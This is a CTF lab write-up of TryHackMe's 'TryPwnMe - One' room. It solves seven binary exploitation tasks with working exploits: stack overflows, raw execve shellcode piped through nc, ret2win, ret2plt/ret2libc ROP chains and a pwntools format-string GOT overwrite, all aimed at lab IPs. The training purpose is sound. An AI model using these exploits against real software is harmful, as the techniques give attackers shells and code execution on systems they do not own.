# TryPwnMe - One

https://tryhackme.com/r/room/trypwnmeone, the fact that this is 'one' sounds like a threat. Rated medium, but its really a collection of easy-level pwn exercises.

Task 1 and 2 were an intro and provided a link to download the executables for the later tasks, which were also available on the Attack box. For pwn exercises mimicing the protections in place on the target machine (or more accurately the lack of protections) can sometimes be a challenge, but it wasn't too much of a problem here.

The first four actuall challenges can be solved with just `echo` and `cat`, as they require no interaction with the target (e.g. no reading and processing of content back), while the last three were solved with pwntools.

## Task 3

Code provided:

```c
int main(){
    setup();
    banner();
    int admin = 0;
    char buf[0x10];

    puts("PLease go ahead and leave a comment :");
    gets(buf);

    if (admin){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        char ch;
        while ((ch = fgetc(file)) != EOF) {
            putchar(ch);
    }
    fclose(file);
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

TLDR: the admin variable needs to be changed from `0x0` to `0x1`, and there is a basic overflow out of a 16 byte buffer (`0x10`). This can be solved with the following command:

```bash
echo -e "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x1\x1\x1\x1\x1\x1\x1\x1" | nc [TARGETIP] 9003
```
Note I use four byte blocks of characters like A, B, C etc here and in some later challenges. With GDB, submitting payloads like this (via `r < <(echo "whatever)`) will, when the program segfaults because you overrode the return value, show the bytes that were bad, e.g. 43434343 indicates CCCC, giving you the amount of padding required. For the challenge above though, I used GDB to view the stack, and find what offset was being compared in that `if (admin){` call, then overflowed with more and more data until I could see `0x0` turned to `F`. It could have also been done just by overflowing with like a hundred \x1's, e.g. `echo -e "\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1\x1"`.

## Task 4

Code:

```c
int read_flag(){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        if(!file){
            puts("the file flag.txt is not in the current directory, please contact support\n");
            exit(1);
        }
        char ch;
        while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }
    fclose(file);
}

int main(){
    
    setup();
    banner();
    int admin = 0;
    int guess = 1;
    int check = 0;
    char buf[64];

    puts("Please Go ahead and leave a comment :");
    gets(buf);

    if (admin==0x59595959){
            read_flag();
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

Same as before. `0x59` is 'Y':

```bash
echo -e "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY" | nc 10.10.88.29 9004
```

Here I did what I suggested for the previous task, and didn't bother finding the offset. Instead I just threw lots of 'Y's at it until it worked.

## Task 5

Code:

```c
int main(){
    setup();
    banner();
    char *buf[128];   

    puts("\nGive me your shell, and I will execute it: ");
    read(0,buf,sizeof(buf));
    puts("\nExecuting Spell...\n");

    ( ( void (*) () ) buf) ();

}
```

This is whats called a shellcode runner, and isn't really a challenge (assuming you know what shellcode is). I used a simple shell code from here on shellstorm: https://shell-storm.org/shellcode/files/shellcode-806.html

```bash
{ echo -e "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; cat; } | nc 10.10.88.29 9005
```

Note the use of `cat` here, for the first time. We are opening a shell, and we want to copy the stdout of that shell to the stdout of our interface. Cat does this: it will read output from the shell and echo it back to us; also cat has the notable feature that when run without arguments, it *stays* open (run it youself if you like), meaning this will keep the shell alive and talking back.

## Task 6

Code:

```c
int win(){

    system("/bin/sh");
}

void vuln(){
    char *buf[0x20];
    puts("Return to where? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    vuln();
}
```

This is called a "ret2win" in pwn circles, and basically requires you to override the return address saved on the stack (from the call to vuln, but it would also have worked if you were just in main as main itself is called by other code) so that when the function returns, instead of going back to its calling location it moves to this 'win' function (literally called 'win' here).

It only works if the binary has been compiled as a non-PIE (position independant executable) - meaning that when run, the addresses of its functions remain the same every time (in PIE the processes' base address is random, so you can't know where a function will be ahead of time). 

An additional quirk here is that this is a **64-bit binary**, becase of this something called stack alignment comes into play. This is (I believe?) an issue due to the offset for addresses being eight bytes in 64bit (compared to four in 32bit) but only six bytes being used (they decided using all eight would be silly given how much memory that would represent, not giving a care for all the hurt exploit developers over time). To fix stack alignment, you override the return address with the address of a 'ret' instruction in the binary, then follow with the target address you want to jump to. The ret instruction pops the following address into the instruction pointer, solving any stack alignment issues.

- to confirm 64 bit and non-PIE, I ran `checksec [binary name]` - you can also work out this information from `file [binary name]`.
- to find the target vuln address, I ran gdb on the binary then ran 'info functions', which listed the function addresses
- to find a ret instruction, I ran `objdump -d [binary name] | grep ret`

```bash
{ echo -e "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCC\x1a\x10\x40\x00\x00\x00\x00\x00\xdd\x11\x40\x00\x00\x00\x00\x00"; cat; } | nc 10.10.88.29 9006
```

note here the offset is important, as I need to find the exact padding before I overwrite the return address. Here, `\x1a\x10\x40\x00\x00\x00\x00\x00` is the 'ret' instruction's address that I found, typed in reverse and padded to eight bytes with `\x00` (the address as presented by objdump or gdb would be `\x40101a`), with the win function's address being `\xdd\x11\x40\x00\x00\x00\x00\x00` (again padded, reversed).

## Task 7

First requiring pwntools. Code:

```c
int win(){
    system("/bin/sh\0");
}

void vuln(){
    char *buf[0x20];
    printf("I can give you a secret %llx\n", &vuln);
    puts("Where are we going? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    banner();
    vuln();
}
```

This is another ret2win (with win here being a shell) but this is a PIE executable, meaning its base address is randomised. Helpfully the function prints out the address of its own function for you, which is called a 'leak' in pwn circles. This allows us to bypass the PIE protection:

1. we can ahead of time find the address of both `vuln` and `win`.
2. we read the leak as the program is running, and subtract the address of vuln from it to get the base address.
3. we then add the address of win to the base address, to get its real address
4. we use this for the overflow as normal.

Because we need to read and calculate the addresses during execution flow, this is easier to do with pwntools which has plenty of utils for this purpose. It could be done with bash, or any programming language, but pwntools is on the attack box and is easy:

```python
from pwn import *

p = remote('10.10.88.29, 9007') # process("./random")

p.readuntil(b"give you a secret ");
read_addr = p.readline()
read_addr = read_addr.strip()
read_addr = int(read_addr, 16)

target_addr = read_addr - 265
target_addr = p64(target_addr)

ret_address = read_addr - 767
ret_address = p64(ret_address)

p.clean()

padding = b"A" * 264
payload = padding + ret_address + target_addr

p.sendline(payload)
p.interactive()
```

In the above code, I precalculated the difference between the vuln address and win, rather than offsetting off the base address, but the principle is the same. Note I still needed the 'ret' instruction for stack alignment, which I also needed to adjust for the live address.

## Task 8

Code:

```c
void vuln(){
    char *buf[0x20];
    puts("Again? Where this time? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
    }

int main(){
    setup();
    vuln();

}
```

This actually took me the longest to solve, because I didn't recognise what it was, actually two things: its a 'ret2plt' and a 'ret2libc' (though a ret2plt is basically always a ret2libc as well). A ret2libc is when you don't have any win function, or way of running shell code etc, but since almost all binaries use libc and libc contains both the `system` function and a string in it somewhere like `/bin/sh`, you can set up your stack with the address of system and the address of the string and have the normal execution run `/bin/sh` for you, spawning a shell.

In order for a ret2libc to work, its best to know the exact version of libc the binary is using, which is often different between your attack box and the target (this can trip up many an exploit writer). Here they provide the libc for you, and the binary is built to use that exact file which is local to it, so that problem is solved. However, the reason why we need 'ret2plt' is because the libc binary is PIE, meaning the address of system and the /bin/sh string are random on launch. Fortunately the binary itself is non-PIE, meaning we can work out somethings, name the address of functions in the PLT table.

PLT/GOTs are facilities in a binary that provide lookups to target functions. The code above calls puts, but the address of puts (which is in libc) is not known at compile time as libc is PIE. Instead, when run, the OS will put the real addresses into this lookup table which the code above uses. A 'ret2plt' is when we have some functionlity that writes data to the screen, like we have here with puts that we know is in the plt. What we do is we overflow as normal, but instead of returning to system, we call puts via our overflow and give it as an argument the address of puts itself. Finally we set the return address following the call to puts back to the main function, going around again - now we have the real address of puts, we can calcualate the base address of libc, then calculate the real addresses of system and /bin/sh, and do the overflow again to get a shell.

A little bit complicated, and stack alignment can be a pain in the ass, but it works:

```python
from pwn import *

# p = process("./thelibrarian")
# gdb.attach(p)
p = remote('10.10.88.29', 9008)

p.clean()

binary = ELF('./thelibrarian')
libc = ELF('./libc.so.6')

puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main_addr = binary.symbols['main']

rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] # could be prefound, but bah
ret_gadget = rop.find_gadget(['ret'])[0]

offset = 264

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendline(payload)
p.recvuntil(b"let's go!\n\n")

puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
puts_offset = libc.symbols['puts']
libc_base = puts_leak - puts_offset
system_addr = libc_base + libc.symbols['system']
exit_addr = libc_base + libc.symbols['exit']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

p.clean()

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(ret_gadget)  
payload += p64(system_addr)
payload += p64(exit_addr) # not really required

p.sendline(payload)
p.interactive()
```

Took me a few hours, costing me position 1 on the board, but fun to do. Main issue that held me up the longest was not realising I needed that ret gadget in the call to system, so fiddly.

## Task 9

Code:

```c
int win(){

    system("/bin/sh\0");

}

int main(){

    setup();

    banner();

    char *username[32];

    puts("Please provide your username\n");

    read(0,username,sizeof(username));

    puts("Thanks! ");

    printf(username);

    puts("\nbye\n");

    exit(1);    

}
```

In comparison, much easier than 8 largely due to pwntools being a boss. This is called a 'format string exploit', because for reasons only known to the ancient C library authors that have made all of infosec possible (🫡), printf (where you print strings with %s, numbers with %d, etc) includes %n which *writes* to a target memory location the 'number of bytes read so far'. Since addresses are just numbers, if you can find a target address and then manipulate the format string to read that many bytes (or usually just write different portions at a time) you can overrite the return address of the function with a new address and hijack exectution, here with a classic ret2win.

Constructing a format string to do this is complicated - not impossible, not even all that hard, but complex and time consuming. Which is why its great that pwntools can do it with one line once you have worked out where the return address is relative to the exploit (use `ABCD|%1$p` and increment that number until the result prints out `44434241`, here its 6):

```python
from pwn import *

p = remote('10.10.88.29',9009)
# p = process()

elf = context.binary = ELF('./notspecified')

p.clean()

payload = fmtstr_payload(6, {elf.got['puts'] : elf.sym['win']})
p.sendline(payload)

p.clean()
p.interactive()
```
